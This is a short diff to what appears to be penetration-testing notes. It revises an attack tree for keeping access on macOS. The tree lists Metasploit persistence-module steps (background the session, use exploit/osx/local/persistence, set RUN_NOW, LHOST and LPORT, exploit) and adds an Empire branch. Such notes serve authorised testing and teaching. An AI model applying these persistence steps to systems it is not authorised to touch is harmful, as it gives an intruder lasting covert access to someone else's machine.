@@ -1,9 +1,9 @@
-# Maintaining access on macOS with Meterpreter
+# Maintaining access on macOS
 
 ## Attack tree
 
 ```text
-1 Maintain access on Windows
+1 Maintain access on macOS using meterpreter
     1.1 In meterpreter background the current basic shell (AND)
     1.2  > use exploit/osx/local/persistence (AND)
     1.3 Set RUN_NOW to true (AND)
@@ -13,6 +13,7 @@
     1.7 Set LHOST and LPORT
     1.8 > exploit
     1.9 Copy the three commands given for cleanup later
+1 Maintain access on macOS using empire
 ```
 
 ## Notes
